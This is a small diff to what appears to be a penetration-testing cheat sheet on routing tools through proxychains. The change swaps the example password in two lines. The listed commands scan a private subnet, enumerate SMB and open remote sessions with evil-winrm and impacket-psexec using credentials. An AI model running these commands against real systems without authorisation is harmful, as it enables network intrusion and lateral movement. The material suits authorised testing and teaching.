@@ -12,8 +12,8 @@ command: |
   # Run any tool through the proxy
   proxychains nmap -sT -Pn 172.16.1.0/24
   proxychains crackmapexec smb 172.16.1.0/24
-  proxychains evil-winrm -i 172.16.1.10 -u admin -p 'password123'
-  proxychains impacket-psexec test.local/admin:password123@172.16.1.10
+  proxychains evil-winrm -i 172.16.1.10 -u admin -p 'P@ssw0rd123'
+  proxychains impacket-psexec test.local/admin:P@ssw0rd123@172.16.1.10
 
   # With specific config file
   proxychains -f /tmp/proxychains.conf nmap -sT -Pn 172.16.1.10
